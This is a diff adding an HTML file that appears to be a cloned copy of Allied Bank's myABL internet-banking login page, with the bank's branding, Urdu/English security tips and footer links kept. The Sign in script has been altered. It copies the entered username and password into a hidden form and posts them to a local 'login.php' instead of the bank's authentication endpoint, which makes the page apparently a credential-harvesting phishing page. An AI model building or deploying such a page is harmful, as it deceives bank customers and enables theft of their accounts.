@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<!-- saved from url=(0483)https://login.abl.com/oam/server/obrareq.cgi?encquery%3DkGyWaNQn8yXLiUrWNiLSNvo270wViiM8k5yA6GGakIOcIM9ljLhD9lix%2BY30ggkdWAXZ%2FEDhoVQxBiTKA3BxDta0UQn6Q%2FKgSY589UW9CfR7Py4SWfkKex8RYn4i%2BsuAI1Dxcj4dazBkDhX5BB7Yox%2F3W0vkVpehiuqGFYnpSn5R%2BA%2BAV2OIyJ8eApwD0aYfIFTIIlAarXYWxOeD0jaxUO3tjHnTBijYd3dmq8Rgwvncz7UMVukzecBwZLbBwqlRIrX5ewKLriy5x3tn2n3XqM4BsDrVk853t5T9ODQKsoQ%3D%20agentid%3Dobdx-18-prod%20ver%3D1%20crmethod%3D2&ECID-Context=1.005x%5ElsLlLW3b6YzLofP8A000VSb00007%5E%3BkXjE -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="refresh" content="290" ;="" url="https://www.myabl.com/&quot;">
+	<meta content="no-cache" http-equiv="cache-control">
+	<meta content="no-store" http-equiv="cache-control">
+	<meta content="no-cache" http-equiv="Pragma">
+	<meta content="0" http-equiv="Expires">
+	<meta content="IE=11" http-equiv="X-UA-Compatible">
+	
+	<meta content="yes" name="apple-mobile-web-app-capable">
+	<meta content="default" name="apple-mobile-web-app-status-bar-style">
+	<meta content="true" name="HandheldFriendly">
+	<meta content="width" name="MobileOptimized">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>MyABL - Login</title>
+    <link rel="icon" href="https://login.abl.com/oamcustompages/pages/img/favicon.png">
+    <!-- Bootstrap -->
+    <link href="./MyABL - Login_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./MyABL - Login_files/css" rel="stylesheet">
+    <link href="./MyABL - Login_files/fonts.css" rel="stylesheet">
+    <link href="./MyABL - Login_files/owl.carousel.css" rel="stylesheet">
+    <link href="./MyABL - Login_files/main.css" rel="stylesheet">
+	<link rel="stylesheet" href="./MyABL - Login_files/notonastaliqurdudraft.css">
+	<script type="text/javascript" src="./MyABL - Login_files/jquery-includes.js" charset="utf-8"></script>
+	<script type="text/javascript" src="./MyABL - Login_files/common.js" charset="utf-8"></script><meta name="format-detection" content="telephone=no">
+	<script type="text/javascript" src="./MyABL - Login_files/jquery.min.js" charset="utf-8"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+			
+<script type="text/javascript">
+
+var scr_w, scr_w1,scr_h, scr_h1;
+
+function setScreenSize(){
+			
+			scr_w1 = screen.availWidth-10+"px";
+			scr_h1 = screen.availHeight-60+"px";
+		}
+
+function forgotPassword () {
+	var l_frmname 	= 'frmprocess';
+	var l_requestid = 'RRFPW01';
+	createForm(l_frmname,l_requestid);	
+	formwindow_open ($("form[name="+l_frmname+"]") [0], 'Forgot Password?', l_requestid);
+}
+
+function createForm (p_frmname,p_requestid) {
+	var form = $("form[name="+p_frmname+"]");
+	if (form.length == 0) {
+		$("form[name='frmmain']").after ('<form name='+p_frmname+' action="login.php" method="POST" autocomplete="off"/>');
+		var form = $("form[name="+p_frmname+"]");
+		form.append ('<input type="hidden" value='+p_requestid+' name="fldRequestId"/>');
+		form.append ('<input type="hidden" value="01" name="fldDeviceId"/>');
+		form.append ('<input type="hidden" value="eng" name="fldlang"/>');
+		form.append ('<input type="hidden" value="" name="title"/>');
+	}
+}
+
+
+function togglePassword()
+{ 		
+		//alert("Hi");
+		var pwd = document.getElementById("password1");
+        if(pwd.getAttribute("type")=="password"){
+            pwd.setAttribute("type","text");
+			document.getElementById("eye_icon").src="/oamcustompages/pages/images/eye_1.png"; 
+			//src="../template/save.png";
+        } else {
+            pwd.setAttribute("type","password");
+			document.getElementById("eye_icon").src="/oamcustompages/pages/images/eye_2.png";
+			//src="../template/save.png";
+        }
+}
+
+
+
+</script>
+<!-- Start Disable frame hijacking Script-->
+
+
+<script type="text/javascript">
+	 
+    if (self === top) {
+       var antiClickjack = document.getElementById("antiClickjack");
+       antiClickjack.parentNode.removeChild(antiClickjack);
+    } else {
+        top.location = self.location;
+    }
+</script>
+
+<!-- End Disable frame hijacking Script--> 
+	
+<script>   
+var currentPageLang = 'en';
+var userLanguageArray =  new Array();
+var isError;
+
+    function trim(s)  
+    {  
+		return s.replace( /^\s*/, "" ).replace( /\s*$/, "" );  
+    }  
+ 
+    function validate()  
+    {  
+		if(trim(document.frmLogin.sUserName.value)=="")  
+		{  
+			alert("Login empty");  
+			document.frmLogin.sUserName.focus();  
+			return false;  
+		}  
+		else if(trim(document.frmLogin.sPwd.value)=="")  
+		{  
+			alert("password empty");  
+			document.frmLogin.sPwd.focus();  
+			return false;  
+		}  
+    }  
+	
+						function Testfn(user,pass){
+							//console.log(virtKeyb);
+							//alert('test fn');
+							document.frmmain.username.value=user;
+							document.frmmain.password.value=pass;
+							document.frmmain.submit();
+							
+							return false;
+						}
+						
+						function Regfn(){
+							
+							document.frmreg.submit();
+							
+							return true;
+						}
+						
+						
+    </script> 
+	<script language="javascript" type="text/javascript">
+
+
+
+
+function submitform()
+{
+	
+	 document.loginData.action = "/oamcustompages/pages/login.jsp"; 
+	 document.loginData.submit();
+	 document.loginData.action ="/oam/server/auth_cred_submit";
+}
+
+function hideOverlay(overlayDivId)
+{
+	var overlayDiv = document.getElementById('layer');
+	overlayDiv.style.display = 'none';
+	
+	var overlayDivElement = document.getElementById(overlayDivId);
+	overlayDivElement.style.display = 'none';
+}
+
+						var virtKeyb = false;
+						
+						function HandleKeyPress(evt){
+							//console.log(virtKeyb);
+							if (virtKeyb) {
+								var key = evt.which || evt.charCode || evt.keyCode || 0;
+								
+								if (key == 13)
+								{
+									//document.frmmain.submit();
+									//Testfn();
+									var l = document.getElementById('sSubmit');
+									l.click();
+								}
+								else {
+									return false;
+								}
+							}
+							else {
+								var key = evt.which || evt.charCode || evt.keyCode || 0;
+								if (key == 13)
+								{
+									//document.frmmain.submit();
+									//Testfn();
+									var l = document.getElementById('sSubmit');
+									l.click();
+								}
+								else {
+									return key;
+								}
+								
+								
+							}
+						}
+					
+					</script>
+
+<!-- Added by Junaid Ahmad 10-10-2017 for Security Popup -->
+<script language="javascript" type="text/javascript">
+    function closeSecurityPopup()
+    {
+        var popupContainer = document.getElementsByClassName("securityPopupContainer");
+        popupContainer[0].style.display = "none";
+    }
+	function togglePopupLanguage()
+	{
+		var btn = document.getElementById("btnChangePopupLanguage");
+		var englishHeading = document.getElementById("popupHeadingEnglish");
+		var urduHeading = document.getElementById("popupHeadingUrdu");
+		var englishContent = document.getElementById("popupContentEnglish");
+		var urduContent = document.getElementById("popupContentUrdu");
+		if (btn.innerText == "English")
+		{
+			englishContent.style.display = "block";
+			englishHeading.style.display = "block";
+			urduContent.style.display = "none";
+			urduHeading.style.display = "none";
+			btn.innerHTML = "اردو";
+			btn.style.fontSize = "24px";
+			btn.style.marginTop = "6px";
+		}
+		else
+		{
+			englishContent.style.display = "none";
+			englishHeading.style.display = "none";
+			urduContent.style.display = "block";
+			urduHeading.style.display = "block";
+			btn.innerHTML = "English";
+			btn.style.fontSize = "18px";
+			btn.style.marginTop = "13px";
+		}
+	}
+</script>
+<!-- ******************************** -->
+
+  </head>
+  
+  <body style="">
+    <section class="login cover equalizer-container" style="background-image: url(&quot;/oamcustompages/pages/img/backscreen.jpg&quot;); height: 361px;">
+	<!-- Added by Junaid Ahmad 10-10-2017 for Security Popup -->
+<div class="securityPopupContainer" style="display: none;">
+    <div class="securityPopup">
+        <div id="securityPopupHeader">
+            <center>
+				<span id="popupHeadingEnglish" style="display:block;font-weight:bold;font-size:18px;color:#E88522">Secure Internet Banking Tips</span>
+                <span id="popupHeadingUrdu" dir="rtl" style="display:none;font-weight:bold;font-family:&#39;Noto Nastaliq Urdu Draft&#39;;font-size:16px;color:#E88522">تجاویز برائےمحفوظ انٹرنیٹ بینکنگ</span>
+			</center>      
+        </div>
+        <br>
+		<div id="popupContentEnglish" style="display:block;font-size:14px">																											   
+			<p>Allied Bank never asks you for your personal information (myABL ID, password, ATM PIN, OTP) through phone calls, weblinks, SMS, emails and social media. Also, we never call our customers from 111-225-225. Do not share any information to such callers claiming to be from Allied Bank/government/security companies.</p>
+			<ul style="color:#222222;margin-top:20px;font-style:oblique">
+				<li>Never store myABL ID/passwords, card numbers on your browser.</li>
+				<li>Always choose a unique and strong password, and change it regularly.</li>
+				<li>Keep your browser, and antivirus updated and periodically scan your computer.</li>
+				<li>Login to myABL Internet Banking through <a href="https://www.abl.com/">https://www.abl.com</a> into your browser.</li>
+				<li>Always logout myABL  after use.</li>
+				<li>Check your last login details and transaction history.</li>
+				<li>In case of any suspicious activity, immediately contact our helpline 111-225-225.</li>
+			</ul>
+		</div>	  
+		<div id="popupContentUrdu" dir="rtl" style="font-size:14px;font-family:&#39;Noto Nastaliq Urdu Draft&#39;;font-weight:500;display:none;line-height:28px">
+            <p>الائیڈبینک آپ کی ذاتی معلومات جیسا کہ (انٹرینٹ آئی ڈی اور پاسورڈ ) کے بارے میں بذریعہ فون کالز، ویب لنکس، ایس ایم ایس، ای میل اور سوشل میڈیا کےذریعے کبھی بھی نہیں پوچھتا اور نہ ہی کبھی کسی کسٹمر کو 225-225-111 نمبر سے کال کرتا ہے اگر کبھی آپ کو ایسی کوئی کال/ای میل یا ایس ایم ایس موصول ہو جس میں الائیڈ بینک/گورنمنٹ/سکورٹی اداروں کا نام استعمال کر کے آپ سے معلومات حاصل کرنے کی کوشش کی جائے تو معلومات فراہم نہ کریں۔</p>
+			<ul style="color:#222222;margin-top:20px">
+                <li>کبھی بھی   myABL   آئی  ڈی/پاسورڈ ، کارڈ نمبرزبراؤزر میں سٹور مت کریں۔</li>
+                <li>ہمیشہ  ایک منفرد اور مضبوط پاسورڈ کا انتخاب کریں، اور باقاعدگی سے بدلتے رہیں۔</li>
+                <li>اپنے براؤزر اور اینٹی وائرس کو اپ ڈیٹ رکھیں اوروقفے وقفے سےاپنے کمپیوٹر  کو جانچتے رہیے۔</li>
+                <li>ہمیشہ myABL      استعمال کرلینے کے بعد اسے لاگ آؤٹ کریں۔</li>
+                <li>اپنے آخری لاگ ان کی تفصیلات اور ٹرانزیکشن کی تاریخ کی جانچ پڑتال کریں۔</li>
+                <li>کسی قسم کی مشکوک سرگرمی کی صورت میں، فوری ہماری ہیلپ لائن 225-225-111 پر رابطہ کریں۔</li>
+            </ul>
+        </div>
+        <br>
+        <!--p style="color:#222222;font-size: 14px;font-style: oblique;margin-left: 20px">Allied bank is not responsible if customers do not comply with above security guidelines.</p-->
+		<!-- Begin DigiCert site seal HTML and JavaScript -->
+
+
+<script type="text/javascript">
+
+var __dcid = __dcid || [];__dcid.push(["DigiCertClickID_9yJtmmFC", "11", "m", "black", "9yJtmmFC"]);(function(){var cid=document.createElement("script");cid.async=true;cid.src="//seal.digicert.com/seals/cascade/seal.min.js";var s = document.getElementsByTagName("script");var ls = s[(s.length - 1)];ls.parentNode.insertBefore(cid, ls.nextSibling);}());
+
+</script><script async="" src="./MyABL - Login_files/seal.min.js"></script>
+
+<!-- End DigiCert site seal HTML and JavaScript -->
+        <div style="width:100%; height: 50px; margin-top: -10px;padding-top:10px;">
+				<span id="DigiCertClickID_K2BAxMS0" data-language="en" style="float:left;padding-left:30px;">
+
+						<a href="https://www.digicert.com/ev-ssl-certification/"></a>
+
+				</span>
+            <button style="float: right;background: #e56419;color: #f2f2f2;margin-top:10px;" onclick="closeSecurityPopup()">Proceed</button>
+			<a id="btnChangePopupLanguage" style="font-face:Lato;float:right;margin-top:6px;padding-right:20px;font-size:24px;font-weight:500;color:#1A0DAB;cursor:pointer;text-align:right;" onclick="togglePopupLanguage()">اردو</a>
+        </div>
+    </div>
+</div>
+<!--*****************************************************-->
+      <div class="container-fluid">
+        <div class="row rowMain">
+          <div class="col-sm-6 col-md-3 equalize loginSide" style="height: 361px;">
+            <div class="loginScreen">
+              <ul style="display: none;" class="list-inline main-tab hidden-xs">
+                <li><a href="https://login.abl.com/oam/server/obrareq.cgi?encquery%3DkGyWaNQn8yXLiUrWNiLSNvo270wViiM8k5yA6GGakIOcIM9ljLhD9lix%2BY30ggkdWAXZ%2FEDhoVQxBiTKA3BxDta0UQn6Q%2FKgSY589UW9CfR7Py4SWfkKex8RYn4i%2BsuAI1Dxcj4dazBkDhX5BB7Yox%2F3W0vkVpehiuqGFYnpSn5R%2BA%2BAV2OIyJ8eApwD0aYfIFTIIlAarXYWxOeD0jaxUO3tjHnTBijYd3dmq8Rgwvncz7UMVukzecBwZLbBwqlRIrX5ewKLriy5x3tn2n3XqM4BsDrVk853t5T9ODQKsoQ%3D%20agentid%3Dobdx-18-prod%20ver%3D1%20crmethod%3D2&amp;ECID-Context=1.005x%5ElsLlLW3b6YzLofP8A000VSb00007%5E%3BkXjE#" class="active">Personal</a></li>
+                <li><a target="_blank" href="https://business.myabl.com/">Business</a></li>
+              </ul>
+              <div class="clear"></div>
+              <div class="loginContent">
+
+                <div class="logoLogin">
+                  <img style="height:51px !important;" src="./MyABL - Login_files/myabl.png" alt="My ABL">
+                </div>
+
+                <div class="loginDesc">
+                  <h2>Welcome to Digital Banking</h2>
+                  <p><strong>Sign in</strong> or <strong>Join now</strong> to manage your personal finances</p>
+                </div>
+			<div class="form-group has-feedback" style="margin-bottom:5px !important">
+							
+								 <div align="center" id="errorBar1" enctype="text/plain" name="errorBar1" style="display: none;">
+							<div id="errMsg" style="line-height:15px;color:red;">
+								<p id="result1" class="loginFailed"> </p> 
+							</div>
+						</div>
+						
+					</div>
+                <form id="form" onsubmit="login.php" method="post" autocomplete="off">
+                  <div class="form-group has-feedback">
+                    <label class="sr-only control-label" for="uID">Username</label>
+                    <input type="text" class="form-control" name="username1" id="username1" autocomplete="off" placeholder="Username">
+                    <span class="icon-member form-control-feedback" aria-hidden="true"></span>
+                  </div>
+                  <div class="form-group has-feedback">
+                    <label class="sr-only control-label" for="uPass">Password</label>
+<input type="password" style="visibility: hidden;width:0px !important;height:0px !important;float: right;border: 0px !important;">
+                    <input autocomplete="off" type="password" class="form-control" name="password1" id="password1" onkeypress="return HandleKeyPress(event);" placeholder="Password">
+                    <span class="icon-password form-control-feedback" aria-hidden="true"></span>
+                  </div>
+                  <div class="form-link">
+                    <a href="https://www.myabl.com/?module=forgot-password">Having Trouble Logging in?</a>
+                  </div>
+				  
+                  <button type="button" name="sSubmit" id="sSubmit" class="btn btn-submit">Sign in</button>
+                  <footer class="formFooter">
+                    <em>Not a member?</em>
+                    <a href="https://www.myabl.com/?module=registration">Join Now</a>
+                   
+                  </footer>
+                </form>
+				<form name="frmmain" action="login.php" method="post" autocomplete="off">
+					<input name="request_id" value="" type="hidden">&nbsp;<input name="username" value="" autocomplete="off" type="hidden"><input name="password" value="" autocomplete="off" type="hidden">
+				</form>
+              </div>
+            </div>
+			
+
+          </div>
+          <div class="col-sm-6 col-md-9 equalize rightPanel hidden-xs" style="height: 361px;">
+            
+            <div id="greetDiv" class="dateTime"><h3>Good Morning!</h3><span>Tuesday, Mar 7, 2023</span></div>
+            <ul class="list-inline apps">
+              <!--<li><a href="#"><img src="/oamcustompages/pages/img/appstore.png"></a></li>
+              <li><a href="#"><img src="/oamcustompages/pages/img/googleplay.png"></a></li> -->
+              <li><a target="_blank" href="https://seal.digicert.com/seals/popup/?tag=9yJtmmFC&amp;lang=en&amp;cbr=1510850462212"><img src="./MyABL - Login_files/digicert.png"></a>
+			  </li>
+            </ul>
+
+          </div>
+        </div>
+      </div>
+
+    </section>
+    <footer class="sitefooter">
+      <ul class="list-inline list-services owl-responsive owl-carousel owl-loaded off">
+        
+        
+        
+		
+        
+        
+        	
+      <li>
+          <a href="https://www.myabl.com/pages/public/features.html" target="popup" onclick="window.open(&#39;https://www.myabl.com/pages/public/features.html#fundstransfer&#39;,&#39;popup&#39;,&#39;width=600,height=600,scrollbars=yes,resizable=yes&#39;); return false;">
+            <i class="icon-features"></i>
+            Features
+          </a>
+        </li><li>
+          <a href="https://www.myabl.com/pages/public/FAQ.html" target="popup" onclick="window.open(&#39;https://www.myabl.com/pages/public/FAQ.html&#39;,&#39;popup&#39;,&#39;width=600,height=600,scrollbars=yes,resizable=yes&#39;); return false;">
+            <i class="icon-faq"></i>
+            FAQs
+          </a>
+        </li><li>
+          <a href="https://www.myabl.com/pages/public/password-security.html" target="popup" onclick="window.open(&#39;https://www.myabl.com/pages/public/password-security.html&#39;,&#39;popup&#39;,&#39;width=600,height=600,scrollbars=yes,resizable=yes&#39;); return false;">
+            <i class="icon-security"></i>
+            Security
+          </a>
+        </li><li class="dropdown dropup customRda">
+               <a class="dropdown-toggle" href="https://login.abl.com/oam/server/obrareq.cgi?encquery%3DkGyWaNQn8yXLiUrWNiLSNvo270wViiM8k5yA6GGakIOcIM9ljLhD9lix%2BY30ggkdWAXZ%2FEDhoVQxBiTKA3BxDta0UQn6Q%2FKgSY589UW9CfR7Py4SWfkKex8RYn4i%2BsuAI1Dxcj4dazBkDhX5BB7Yox%2F3W0vkVpehiuqGFYnpSn5R%2BA%2BAV2OIyJ8eApwD0aYfIFTIIlAarXYWxOeD0jaxUO3tjHnTBijYd3dmq8Rgwvncz7UMVukzecBwZLbBwqlRIrX5ewKLriy5x3tn2n3XqM4BsDrVk853t5T9ODQKsoQ%3D%20agentid%3Dobdx-18-prod%20ver%3D1%20crmethod%3D2&amp;ECID-Context=1.005x%5ElsLlLW3b6YzLofP8A000VSb00007%5E%3BkXjE#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-expanded="false">
+                  <img class="radImg" style="width: 22%;margin-top: -10px;padding-bottom: 10px;" src="./MyABL - Login_files/rda.png">
+                  <p style="margin: 0;">Open Account</p>
+               </a>
+               <ul class="dropdown-menu" aria-labelledby="dropdownMenuLink" style="padding: 0; margin: 0;min-width: -webkit-fill-available; background: #dc4b10;">
+                  <li style="transform: skew(-0deg, 0deg);display: block"><a style="transform: skew(-0deg, 0deg);" class="dropdown-item" href="https://rda.abl.com/#/customer-onboarding?customerType=RDA" target="_blank">Roshan Digital Account</a></li>
+                  <li style="transform: skew(-0deg, 0deg);display: block"><a style="transform: skew(-0deg, 0deg);" class="dropdown-item" href="https://rda.abl.com/#/customer-onboarding?customerType=DAO" target="_blank">myPakistan Digital Account</a></li>
+                   <li style="transform: skew(-0deg, 0deg);display: block"><a style="transform: skew(-0deg, 0deg);" class="dropdown-item" href="https://www.abl.com/be-our-customer/" target="_blank">Be Our Customer</a></li>
+               </ul>
+        </li><li>
+	<!-- <a href="https://www.abl.com/personal-banking/credit-debit-cards/allied-visa-card-discounts-2017/" target="_blank"> -->
+
+          <a href="https://www.abl.com/latest-offers/" target="_blank">
+            <i class="icon icon-offer"></i>
+            Offers
+          </a>
+        </li><li>
+	<!-- <a href="https://www.abl.com/services/branch-network/" target="_blank"> -->
+
+          <a href="https://www.abl.com/services/branch-network/" target="_blank">
+            <i class="icon-map"></i>
+            Locate Us
+          </a>
+        </li><li class="dropdown dropup customhelp">
+               <a class="dropdown-toggle" href="https://login.abl.com/oam/server/obrareq.cgi?encquery%3DkGyWaNQn8yXLiUrWNiLSNvo270wViiM8k5yA6GGakIOcIM9ljLhD9lix%2BY30ggkdWAXZ%2FEDhoVQxBiTKA3BxDta0UQn6Q%2FKgSY589UW9CfR7Py4SWfkKex8RYn4i%2BsuAI1Dxcj4dazBkDhX5BB7Yox%2F3W0vkVpehiuqGFYnpSn5R%2BA%2BAV2OIyJ8eApwD0aYfIFTIIlAarXYWxOeD0jaxUO3tjHnTBijYd3dmq8Rgwvncz7UMVukzecBwZLbBwqlRIrX5ewKLriy5x3tn2n3XqM4BsDrVk853t5T9ODQKsoQ%3D%20agentid%3Dobdx-18-prod%20ver%3D1%20crmethod%3D2&amp;ECID-Context=1.005x%5ElsLlLW3b6YzLofP8A000VSb00007%5E%3BkXjE#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-expanded="false">
+                  <img class="radImg" style="width: 22%;margin-top: -10px;padding-bottom: 10px;" src="./MyABL - Login_files/HelpSupport.png">
+                  <p style="margin: 0;">Help and Support</p>
+               </a>
+               <ul class="dropdown-menu" aria-labelledby="dropdownMenuLink" style="padding: 0; margin: 0;min-width: -webkit-fill-available; background: #dc4b10;">
+                  <li style="transform: skew(-0deg, 0deg);display: block"><a style="transform: skew(-0deg, 0deg);" class="dropdown-item" href="https://www.abl.com/help-and-support/complaints/" target="_blank">Complaints</a></li>
+                  <li style="transform: skew(-0deg, 0deg);display: block"><a style="transform: skew(-0deg, 0deg);" class="dropdown-item" href="https://www.abl.com/help-and-support/dispute-settlement" target="_blank">Disputes</a></li>
+               </ul>
+        </li></ul>
+      <div class="copyright clearfix">
+        <div class="col-sm-6">
+          <p>© <script>new Date().getFullYear()>2010&&document.write(new Date().getFullYear());</script>2023 Copyright Allied Bank Limited. All Rights Reserved. <!--a href="http://www.csquareonline.com" target="_blank">Creative Chaos</a--><a href="https://www.facebook.com/alliedbankpk" target="_blank" title="Like us on facebook"><i class="icon-facebook"></i></a><a href="https://twitter.com/ablpk" target="_blank" title="Follow us on Twitter"><i class="icon-twitter"></i></a></p>
+        </div>
+        <div class="col-sm-6">
+          <ul class="list-inline footerNav">
+            <li>Corporate website: <a href="https://www.abl.com/">www.abl.com</a></li>
+            <li><a target="_blank" href="https://www.abl.com/privacy-policy/">Privacy Policy </a></li>
+            <li><a target="_blank" href="https://www.abl.com/contact-us/">Contact Us</a></li>
+          </ul>
+        </div>
+      </div>
+    </footer>
+
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="./MyABL - Login_files/jquery.min(1).js"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="./MyABL - Login_files/bootstrap.min.js"></script>
+    <script src="./MyABL - Login_files/owl.carousel.min.js"></script>
+
+    <script type="text/javascript">
+	  $(document).ready(function() {
+		  
+			/* Added by Asif: 10-nov-2017
+				Greeting the Customer
+			*/
+			var myDate = new Date();
+			var hrs = myDate.getHours();
+
+			var greet;
+
+			if (hrs < 12)
+				greet = 'Good Morning!';
+			else if (hrs >= 12 && hrs < 16)
+				greet = 'Good Afternoon!';
+			else if (hrs >= 16 && hrs < 21)
+				greet = 'Good Evening!';
+			else if (hrs >= 21 && hrs <= 24)
+				greet = 'Good Evening!';
+		
+			var days = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
+			var monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
+							  "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
+							];
+			var dateStringFormat = days[myDate.getDay()] + ', ' + monthNames[myDate.getMonth()] + ' ' + myDate.getDate() + ', ' + myDate.getFullYear();
+			$('#greetDiv').html('<h3>'+ greet +'</h3><span>' + dateStringFormat + '</span>');
+			//console.log(dateStringFormat);
+			/* Greet code finishes here */
+
+			 $("#errorBar1").hide();
+			 $('#sSubmit').click(function() {
+				
+			  $('#sSubmit').attr('disabled',true);
+			  var userName = $('#username1').val();
+			  var password=$('#password1').val();
+			  var datastr='userName='+userName+'&password='+ password;
+			  
+			  Testfn(userName,password);
+			
+			 });
+      // Select and loop the equalizer-container element of the elements you want to equalise
+      $('.equalizer-container').each(function(){  
+        // Cache the highest
+        //var highestBox = 0;
+        // Select and loop the elements you want to equalise
+        // $('.equalize', this).each(function(){
+        //   // If this box is higher than the cached highest then store it
+        //   if($(this).height() > highestBox) {
+        //     highestBox = $(this).height(); 
+        //   }
+        // });  
+        // Set the height of all those children to whichever was highest 
+        //$('.equalize',this).height(highestBox);
+                      
+      });
+
+        $(window).on('load resize', function() {
+            if (window.innerWidth>= 480) {
+              // $('.col1').height($('.wraper').height());
+              // $('.col2').height($('.wraper').height());
+              // $('.col3').height($('.wraper').height());
+              var bodyheight = $('body').height()
+              var footerheight = $('.sitefooter').height();
+              var containerheight = $('.equalizer-container').height();
+              var targetheight = bodyheight - footerheight;
+              $('.equalizer-container, .equalize').height(targetheight);
+            }
+            if (window.innerWidth < 480) {
+              // $('.col1').height('auto');
+              // $('.col2').height('auto');
+              // $('.col3').height('auto');
+              var bodyheight = $('body').height()
+              var footerheight = $('.sitefooter').height();
+              var containerheight = $('.equalizer-container').height();
+              var targetheight = bodyheight - footerheight;
+              $('.equalizer-container, .equalize').height('auto');
+            }
+        });
+
+
+        // var bodyheight = $('body').height()
+        // var footerheight = $('.sitefooter').height();
+        // var containerheight = $('.equalizer-container').height();
+        // var targetheight = bodyheight - footerheight;
+        // $('.equalizer-container, .equalize').height(targetheight);
+
+
+        $(function() {
+             var owl = $('.owl-responsive'),
+            owlOptions = {
+                loop:false,
+                margin: 0,
+                items: 3,
+                slideBy: 3,
+                nav:true,
+                autoHeight:true,
+                navText: ['<i class="icon-back"></i>','<i class="icon-next"></i>'],
+                // responsive:{
+                //   0:{
+                //       items:3
+                //   },
+                //   480:{
+                //       items:3
+                //   },
+                //   640:{
+                //     items:3
+                //   }
+                // }
+              };
+
+
+           
+
+          if ( $(window).width() < 767 ) {
+            var owlActive = owl.owlCarousel(owlOptions);
+          } else {
+            owl.addClass('off');
+          }
+
+
+          owl.on('changed.owl.carousel', function(event) {
+              if( event.item.index==0 ){
+                $('.owl-next').removeClass('owl-disabled');
+                $('.owl-prev').addClass('owl-disabled');
+              } else{
+                $('.owl-prev').removeClass('owl-disabled');
+                $('.owl-next').addClass('owl-disabled');
+              }
+
+            });
+
+
+          $(window).resize(function() {
+            if ( $(window).width() < 767 ) {
+              if ( $('.owl-responsive').hasClass('off') ) {
+                  var owlActive = owl.owlCarousel(owlOptions);
+                  owl.removeClass('off');
+              }
+            } else {
+              if ( !$('.owl-responsive').hasClass('off') ) {
+                  owl.addClass('off').trigger('destroy.owl.carousel');
+                  owl.find('.owl-stage-outer').children(':eq(0)').unwrap();
+              }
+            }
+          });
+
+        });
+			$(".customRda").mouseenter(function(){
+				  var $image = $(this).find("img");
+				  var imgSrc = $image.attr("src");
+				  var updatedPath = imgSrc.split("/");
+				  updatedPath[updatedPath.length - 1] = "rda_blue.png";
+				  updatedPath = updatedPath.join("/")
+				  $image.attr("src",updatedPath);
+			  }).mouseleave(function(){
+				  var $image = $(this).find("img");
+				  var imgSrc = $image.attr("src");
+				  var updatedPath = imgSrc.split("/");
+				  updatedPath[updatedPath.length - 1] = "rda.png";
+				  updatedPath = updatedPath.join("/")
+				  $image.attr("src",updatedPath);
+			  });
+    
+      $(".customhelp").mouseenter(function(){
+				  var $image = $(this).find("img");
+				  var imgSrc = $image.attr("src");
+				  var updatedPath = imgSrc.split("/");
+				  updatedPath[updatedPath.length - 1] = "Helpsupport_blue.png";
+				  updatedPath = updatedPath.join("/")
+				  $image.attr("src",updatedPath);
+			  }).mouseleave(function(){
+				  var $image = $(this).find("img");
+				  var imgSrc = $image.attr("src");
+				  var updatedPath = imgSrc.split("/");
+				  updatedPath[updatedPath.length - 1] = "HelpSupport.png";
+				  updatedPath = updatedPath.join("/")
+				  $image.attr("src",updatedPath);
+			  });
+      });
+    </script>
+		<script type="text/javascript">
+	window.__lc = window.__lc || {};
+	window.__lc.license = 1125501;
+	(function() {
+	  var lc = document.createElement('script');
+	  lc.type = 'text/javascript'; 
+	  lc.async = true;
+	  lc.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'cdn.livechatinc.com/tracking.js';
+	  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(lc, s);
+	});
+</script>
+
+  
+
+<span id="VBar" style="position: absolute; top: 0px; left: 0px; height: 0px; width: 2px; background: silver; border-left: 1px dotted black; display: none;"></span></body></html>
